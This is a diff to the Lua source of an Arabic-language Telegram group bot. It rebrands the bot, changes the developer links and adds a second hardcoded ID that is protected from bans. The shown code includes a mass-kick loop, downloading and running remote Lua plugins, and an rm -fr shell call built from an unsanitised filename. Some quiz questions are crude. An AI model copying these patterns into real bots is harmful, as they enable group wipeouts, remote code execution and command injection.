+send(msg.chat_id_, msg.id_, " ⦁ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "SO_ALSIYAD")..")\n ⦁ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."HiMA:teh"..msg.chat_id_).."} بجانب اسمك\n ⦁ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
 end
 end
 end
@@ -3121,15 +3121,15 @@ if text and database:get(bot_id.."Ttn:BBE:stats"..msg.chat_id_) == "open" then
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then
-local hima ChengName = database:get(bot_id.."hima :Cheng:Name"..data.id_)
+local HiMAChengName = database:get(bot_id.."HiMA:Cheng:Name"..data.id_)
 if not data.first_name_ then 
-if hima ChengName then 
-send(msg.chat_id_, msg.id_, " خوش معرف جان ["..hima ChengName..']')
-database:del(bot_id.."hima :Cheng:Name"..data.id_) 
+if HiMAChengName then 
+send(msg.chat_id_, msg.id_, " خوش معرف جان ["..HiMAChengName..']')
+database:del(bot_id.."HiMA:Cheng:Name"..data.id_) 
 end
 end
 if data.first_name_ then 
-if hima ChengName ~= data.first_name_ then 
+if HiMAChengName ~= data.first_name_ then 
 local Text = {
   "جان اسمك خوش اسم ",
 "ليش غيرت اسمك يحلو ",
@@ -3137,7 +3137,7 @@ local Text = {
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
-database:set(bot_id.."hima :Cheng:Name"..data.id_, data.first_name_) 
+database:set(bot_id.."HiMA:Cheng:Name"..data.id_, data.first_name_) 
 end
 end
 end
@@ -3155,15 +3155,15 @@ if text and database:get(bot_id.."Ttn:Userr:stats"..msg.chat_id_) == "open" then
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then
-local hima ChengUserName = database:get(bot_id.."hima :Cheng:UserName"..data.id_)
+local HiMAChengUserName = database:get(bot_id.."HiMA:Cheng:UserName"..data.id_)
 if not data.username_ then 
-if hima ChengUserName then 
-send(msg.chat_id_, msg.id_, 1, "مسح معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..hima ChengUserName..']')
-database:del(bot_id.."hima :Cheng:UserName"..data.id_) 
+if HiMAChengUserName then 
+send(msg.chat_id_, msg.id_, 1, "مسح معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..HiMAChengUserName..']')
+database:del(bot_id.."HiMA:Cheng:UserName"..data.id_) 
 end
 end
 if data.username_ then 
-if hima ChengUserName ~= data.username_ then 
+if HiMAChengUserName ~= data.username_ then 
 local Text = {
 'شكو غيرت معرفك شنو نشروك بقنوات نحراف 🌞😹😹😹',
 "هاها شو غيرت معرفك بس لا هددوك 🤞😂😂",
@@ -3175,7 +3175,7 @@ local Text = {
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
-database:set(bot_id.."hima :Cheng:UserName"..data.id_, data.username_) 
+database:set(bot_id.."HiMA:Cheng:UserName"..data.id_, data.username_) 
 end
 end
 end
@@ -3193,15 +3193,15 @@ if text and database:get(bot_id.."Ttn:Ph:stats"..msg.chat_id_) == "open" then
 tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 if data.id_ then 
 if data.id_ ~= bot_id then 
-local hima ChengPhoto = database:get(bot_id.."hima :Cheng:Photo"..data.id_)
+local HiMAChengPhoto = database:get(bot_id.."HiMA:Cheng:Photo"..data.id_)
 if not data.profile_photo_ then 
-if hima ChengPhoto then 
+if HiMAChengPhoto then 
 send(msg.chat_id_, msg.id_, "مسح كل صوره الحلو 😂👌🏻")
-database:del(bot_id.."hima :Cheng:Photo"..data.id_) 
+database:del(bot_id.."HiMA:Cheng:Photo"..data.id_) 
 end
 end
 if data.profile_photo_.big_.persistent_id_ then 
-if hima ChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
+if HiMAChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
 local Text = {
   "شكو غيرت صورتك  يا حلو ",
   "منور طالع حلو عل صوره جديده",
@@ -3212,7 +3212,7 @@ local Text = {
 }
 send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
 end  
-database:set(bot_id.."hima :Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
+database:set(bot_id.."HiMA:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
 end
 end
 end
@@ -3228,8 +3228,9 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '˹𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎˼',url="t.me/H1_MA"},{text = 'ᴛᴀᴡᴀѕụʟ˼', url="t.me/TW_MOHAMED_BOT"}},
-{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ', url="t.me/SO_ALSIYAD"}},
+{{text = '˹ᴏѕᴏѕ ᴏғғʟɪɴᴇ˼',url="t.me/OSDDR"},{text = '˹ᴛᴀʜᴀ➧ᴏғғʟɪɴᴇ˼', url="t.me/Xxx_ksomk_xxX"}},
+{{text = '˹𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎˼', url="t.me/H1_MA"}},
+{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ˼', url="t.me/SO_ALSIYAD"}},
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3241,17 +3242,18 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '˹𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎˼',url="t.me/H1_MA"},{text = HAMO', url="t.me/MO2IBRAHIM"}},
-{{text = '˹ᴛᴏ➧ᴀѕᴋ˼',url="t.me/TW_MOHAMED_BOT"}}, 
-{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ', url="t.me/SO_ALSIYAD"}},
+{{text = '˹ᴏѕᴏѕ ᴏғғʟɪɴᴇ˼',url="t.me/OSDDR"},{text = '˹ᴛᴀʜᴀ➧ᴏғғʟɪɴᴇ˼', url="t.me/Xxx_ksomk_xxX"}},
+{{text = '˹𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎˼', url="t.me/H1_MA"}},
+{{text = '˹ᴛᴏ➧ᴀѕᴋ˼',url="t.me/TWASOLSOON"}}, 
+{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ˼', url="t.me/SO_ALSIYAD"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/29&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
-if text == 'هيما ' or text == 'hima ' or text == 'hima ' then
+if text == 'هيما' or text == 'HiMA' or text == 'HiMA' then
 local Text = [[
-المبرمج هيما  لو حابب تتواصل معاه
+المبرمج هيما لو حابب تتواصل معاه
 اتبع الزر إلى تحت ↓
 
 ]]
@@ -3263,29 +3265,29 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/11&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
-if text == 'حمو'  then
+if text == 'اوس اوس'  then
 local Text = [[
  مالك السورس لو حابب تتواصل معاه
 اتبع الزر إلى تحت ↓
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '˹HAMO˼',url="t.me/H1_MA"}},
+{{text = '˹ᴏѕᴏѕ ᴏғғʟɪɴᴇ˼',url="t.me/OSDDR"}},
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/H1_MA&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/OSDDR&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
-if text == 'محمد ابراهيم'  then
+if text == 'طه'  then
 local Text = [[
  مطور السورس لو حابب تتواصل معاه
 اتبع الزر إلى تحت ↓
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '˹༄𝐷𝑒𝑣 𝙼𝙾𝙷𝙰𝙼𝙴𝙳˼',url="t.me/H1_MA"}},
+{{text = '˹ᴛᴀʜᴀ➧ᴏғғʟɪɴᴇ˼',url="t.me/Xxx_ksomk_xxX"}},
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/H1_MA&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Xxx_ksomk_xxX&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 if text == 'يوتيوب' or text == 'بحث' or text == 'اليوتيوب' then
 local Text = [[
@@ -3314,10 +3316,10 @@ if AddChannel(msg.sender_user_id_) == false then
 return false
 end
 tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000
-},function(ta,hima )
+},function(ta,HiMA)
 local t = "\nツ قائمة الاعضاء \n☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩ \n"
 x = 0
-local list = hima .members_
+local list = HiMA.members_
 for k, v in pairs(list) do
  if tonumber(v.user_id_) ~= tonumber(bot_id) then
 chat_kick(msg.chat_id_,v.user_id_)
@@ -3338,7 +3340,7 @@ https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. ms
 end
 
 
-if text == "تويت" or text == "كت" then 
+if text == "تويت" or text == "كت تويت" then 
 local TWEET_Msg = { 
 "مرتبط؟ ", 
 " هل بتكراش ع حد في حياتك؟", 
@@ -3392,12 +3394,12 @@ local TWEET_Msg = {
 "اخر اغنية سمعتها ?", 
 "تكلم عن نفسك", 
 "ليه انت مش سالك", 
-"ما هيا عيوب سورس الصياد ؟ ", 
+"ما هيا عيوب سورس سون؟ ", 
 "اخر كتاب قرآته", 
 "روايتك المفضله ?", 
 "اخر اكله اكلتها", 
 "اخر كتاب قرآته", 
-"ليه هيما  جدع؟ ", 
+"ليه هيما جدع؟ ", 
 "افضل يوم ف حياتك", 
 "ليه مضيفتش كل جهاتك", 
 "حكمتك ف الحياه", 
@@ -3408,13 +3410,13 @@ local TWEET_Msg = {
 " ما السيء في هذه الحياة ؟ ", 
 "أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
 "سؤال ينرفزك ؟ ", 
-" هل يعجبك سورس الصياد ؟؟ ", 
+" هل يعجبك سورس سون؟؟ ", 
 " اكثر ممثل تحبه ؟ ", 
 "قد تخيلت شي في بالك وصار ؟ ", 
 "شيء عندك اهم من الناس ؟ ", 
 "تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
 "وش أخر شي ضيعته؟ ", 
-"اي رايك في سورس الصياد ؟ ", 
+"اي رايك في سورس سون؟ ", 
 "كم مره حبيت؟ ", 
 " اكثر المتابعين عندك باي برنامج؟", 
 " آخر مره ضربت عشره كانت متى ؟", 
@@ -3627,7 +3629,7 @@ local TWEET_Msg = {
   "تتوقع إنك بتتزوج اللي تحبه؟ ",
   "ما هو أمنيتك؟ ",
   "وين تشوف نفسك بعد خمس سنوات؟ ",
-  "هل انت حرامي تويت بتعت هيما ؟ ",
+  "هل انت حرامي تويت بتعت هيما؟ ",
   "لو خيروك تقدم الزمن ولا ترجعه ورا؟ ",
   "لعبة قضيت وقتك فيه بالحجر المنزلي؟ ",
   "تحب تطق الميانة ولا ثقيل؟ ",
@@ -3635,7 +3637,7 @@ local TWEET_Msg = {
   "اول ماتصحى من النوم مين تكلمه؟ ",
   "عندك الشخص اللي يكتب لك كلام كثير وانت نايم؟ ",
   "قد قابلت شخص تحبه؟ وولد ولا بنت؟ ",
-   "هل انت تحب هيما ؟ ",
+   "هل انت تحب هيما؟ ",
 "اذا قفطت احد تحب تفضحه ولا تستره؟ ",
   "كلمة للشخص اللي يسب ويسطر؟ ",
   "آية من القران تؤمن فيه؟ ",
@@ -3647,7 +3649,7 @@ local TWEET_Msg = {
   "اذكر موقف ماتنساه بعمرك؟ ",
   "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
   "ألطف شخص مر عليك بحياتك؟ ",
-   "هل هيما  لطيف؟ ",
+   "هل هيما لطيف؟ ",
 "انت من الناس المؤدبة ولا نص نص؟ ",
   "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
   "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
@@ -3676,7 +3678,7 @@ local TWEET_Msg = {
   "انسان م تحب تتعامل معاه ابداً ؟ ",
   "شيء بسيط تحتفظ فيه؟ ",
   "فُرصه تتمنى لو أُتيحت لك ؟ ",
-   "لي هيما  ناك اليكس؟ ",
+   "لي هيما ناك اليكس؟ ",
   "شيء مستحيل ترفضه ؟. ",
   "لو زعلت بقوة وش بيرضيك ؟ ",
   "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
@@ -4064,25 +4066,25 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, 
 end
 if text == 'قناة السورس' then
 local Text = [[ 
-[قناه سورس الصياد  ادخل وتابع الجديد](t.me/SO_ALSIYAD)
+[قناه سورس سون ادخل وتابع الجديد](t.me/SO_ALSIYAD)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ', url="t.me/SO_ALSIYAD"}}, 
+{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ˼', url="t.me/SO_ALSIYAD"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qtdao/24&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == '☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩' then
 local Text = [[ 
- ⦁من أحسن السورسات على التليجرام سورس الصياد  ⦁
+ ⦁من أحسن السورسات على التليجرام سورس سون ⦁
 بجد سورس أمان جدا وفي مميزات جامده
 تع نصب بوتك عندنا لو محظور
 خش على تواصل هيدخلك لروم التواصل 
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ', url="t.me/SO_ALSIYAD"}}, 
+{{text = '˹ᴊᴏɪɴ➧ᴀʟѕɪʏᴀᴅ˼', url="t.me/SO_ALSIYAD"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qtdao/24&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -4095,14 +4097,14 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '˹ᴛᴏ➧ᴀѕᴋ˼', url="t.me/TW_MOHAMED_BOT"}}, 
+{{text = '˹ᴛᴏ➧ᴀѕᴋ˼', url="t.me/TWASOLSOON"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/29&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
-if text == 'العاب الصياد ' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
+if text == 'العاب سون' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
 local Text = [[  
- ⦁ اهلا في قائمه الالعاب المتطوره سورس الصياد  ⦁ 
+ ⦁ اهلا في قائمه الالعاب المتطوره سورس سون ⦁ 
 تفضل اختر لعبه من القائمه 
 ]]  
 keyboard = {}   
@@ -4282,7 +4284,7 @@ keyboard.inline_keyboard = {
 {text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
 },
 {
-{text = 'اضف البوت الي مجموعتك ♡ ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{text = 'اضف البوت الي مجموعتك ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -5212,7 +5214,7 @@ send(msg.chat_id_, msg.id_,' ⦁ تم فتح التكرار')
 end
 --------------------------------------------------------------------------------------------------------------
 if text == 'تحديث' and DevSoFi(msg) then    
-dofile('hima .lua')  
+dofile('HiMA.lua')  
 send(msg.chat_id_, msg.id_, ' ⦁ تم تحديث جميع الملفات') 
 end 
 if text == ("مسح قائمه العام") and DevSoFi(msg) then
@@ -5266,15 +5268,15 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(859213488 ) then  
+if tonumber(result.sender_user_id_) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(859213488 ) then  
+if tonumber(result.sender_user_id_) == tonumber(1791666758) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(859213488 ) then  
+if tonumber(result.sender_user_id_) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5316,15 +5318,15 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ⦁ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(859213488 ) then
+if result.id_ == tonumber(859213488) then
 send(msg.chat_id_, msg.id_, " ⦁ لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(859213488 ) then
+if result.id_ == tonumber(1791666758) then
 send(msg.chat_id_, msg.id_, "  لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(859213488 ) then
+if result.id_ == tonumber(859213488) then
 send(msg.chat_id_, msg.id_, " ?? لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
@@ -5360,15 +5362,15 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(859213488 ) then  
+if tonumber(userid) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(859213488 ) then  
+if tonumber(userid) == tonumber(1791666758) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(859213488 ) then  
+if tonumber(userid) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5405,15 +5407,15 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(859213488 ) then  
+if tonumber(result.sender_user_id_) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(859213488 ) then  
+if tonumber(result.sender_user_id_) == tonumber(1791666758) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(859213488 ) then  
+if tonumber(result.sender_user_id_) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -5454,15 +5456,15 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ⦁ لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(859213488 ) then
+if result.id_ == tonumber(859213488) then
 send(msg.chat_id_, msg.id_, " ⦁ لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(859213488 ) then
+if result.id_ == tonumber(1791666758) then
 send(msg.chat_id_, msg.id_, " ⦁ لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(859213488 ) then
+if result.id_ == tonumber(859213488) then
 send(msg.chat_id_, msg.id_, " ⦁ لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
@@ -5498,15 +5500,15 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(859213488 ) then  
+if tonumber(userid) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(859213488 ) then  
+if tonumber(userid) == tonumber(1791666758) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(859213488 ) then  
+if tonumber(userid) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " ⦁ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -5690,7 +5692,7 @@ end
 
 
 if text == 'الملفات' and DevSoFi(msg) then
-t = ' ⦁ ملفات السورس الصياد ↓\n ☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩ \n'
+t = ' ⦁ ملفات السورس سون↓\n ☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩ \n'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
 if v:match(".lua$") then
@@ -5707,8 +5709,8 @@ if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
-local TextS = "\n ⦁ اهلا بك في متجر ملفات الصياد \n ⦁ ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
-local TextE = "\n☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n ⦁ علامة تعني { ✔️ } ملف مفعل\n ⦁ علامة تعني { ✖ } ملف معطل\n ⦁ قناة سورس الصياد ↓\n".." ⦁ [اضغط هنا لدخول](t.me/SO_ALSIYAD) \n"
+local TextS = "\n ⦁ اهلا بك في متجر ملفات سون\n ⦁ ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
+local TextE = "\n☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n ⦁ علامة تعني { ✔️ } ملف مفعل\n ⦁ علامة تعني { ✖ } ملف معطل\n ⦁ قناة سورس سون↓\n".." ⦁ [اضغط هنا لدخول](t.me/SO_ALSIYAD) \n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
 local Check_File_is_Found = io.open("File_Bot/"..name,"r")
@@ -5744,9 +5746,9 @@ local json_file, res = https.request("https://raw.githubusercontent.com/Ffasit/p
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
-dofile('hima .lua')  
+dofile('HiMA.lua')  
 else
-send(msg.chat_id_, msg.id_," ⦁ عذرا الملف لايدعم سورس الصياد \n") 
+send(msg.chat_id_, msg.id_," ⦁ عذرا الملف لايدعم سورس سون\n") 
 end
 return false
 end
@@ -5766,9 +5768,9 @@ local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
 chek:close()
 send(msg.chat_id_, msg.id_,t) 
-dofile('hima .lua')  
+dofile('HiMA.lua')  
 else
-send(msg.chat_id_, msg.id_," ⦁ عذرا الملف لايدعم سورس الصياد \n") 
+send(msg.chat_id_, msg.id_," ⦁ عذرا الملف لايدعم سورس سون\n") 
 end
 return false
 end
@@ -5922,15 +5924,15 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false 
 end
-if text == ("مسح قائمه الصياد ") and Sudo(msg) then
+if text == ("مسح قائمه سون") and Sudo(msg) then
 database:del(bot_id..'CoSu'..msg.chat_id_)
-send(msg.chat_id_, msg.id_, '\n ⦁ تم مسح قائمه الصياد ')
+send(msg.chat_id_, msg.id_, '\n ⦁ تم مسح قائمه سون')
 return false
 end
 
-if text == 'قائمه الصياد ' and Sudo(msg) then
+if text == 'قائمه سون' and Sudo(msg) then
 local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
-t = "\n ⦁ قائمه الصياد \n☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n"
+t = "\n ⦁ قائمه سون\n☩━━━━━☩𝐒𝐈𝐘𝐀𝐃☩━━━━━☩\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -5940,7 +5942,7 @@ t = t..""..k.."- (`"..v.."`)\n"
 end
 end
 if #list == 0 then
-t = " ⦁ لا يوجد احد في قائمه الصياد "
+t = " ⦁ لا يوجد احد في قائمه سون"
 end
 send(msg.chat_id_, msg.id_, t)
 return false
@@ -5962,7 +5964,7 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 
-if text == ("رفع الصياد ") and msg.reply_to_message_id_ and Sudo(msg) then
+if text == ("رفع سون") and msg.reply_to_message_id_ and Sudo(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -5976,15 +5978,15 @@ function start_function(extra, result, success)
 database:sadd(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 usertext = '\n ⦁ الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
-status  = '\n ⦁ تم ترقيته الصياد '
+status  = '\n ⦁ تم ترقيته سون'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
-if text and text:match("^رفع الصياد @(.*)$") and Sudo(msg) then
-local username = text:match("^رفع الصياد @(.*)$")
+if text and text:match("^رفع سون@(.*)$") and Sudo(msg) then
+local username = text:match("^رفع سون@(.*)$")
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -6002,7 +6004,7 @@ return false
 end      
 database:sadd(bot_id..'CoSu'..msg.chat_id_, result.id_)
 usertext = '\n ⦁ الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
-status  = '\n ⦁ تم ترقيته الصياد '
+status  = '\n ⦁ تم ترقيته سون'
 texts = usertext..status
 else
 texts = ' ⦁ لا يوجد حساب بهاذا المعرف'
@@ -6012,8 +6014,8 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-if text and text:match("^رفع الصياد (%d+)$") and Sudo(msg) then
-local userid = text:match("^رفع الصياد (%d+)$") 
+if text and text:match("^رفع سون(%d+)$") and Sudo(msg) then
+local userid = text:match("^رفع سون(%d+)$") 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -6027,16 +6029,16 @@ database:sadd(bot_id..'CoSu'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
 usertext = '\n ⦁ الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
-status  = '\n ⦁ تم ترقيته الصياد '
+status  = '\n ⦁ تم ترقيته سون'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
 usertext = '\n ⦁ الـعـضو   ↚ '..userid..''
-status  = '\n ⦁ تم ترقيته الصياد '
+status  = '\n ⦁ تم ترقيته سون'
 send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("تنزيل الصياد ") and msg.reply_to_message_id_ and Sudo(msg) then
+if text == ("تنزيل سون") and msg.reply_to_message_id_ and Sudo(msg) then
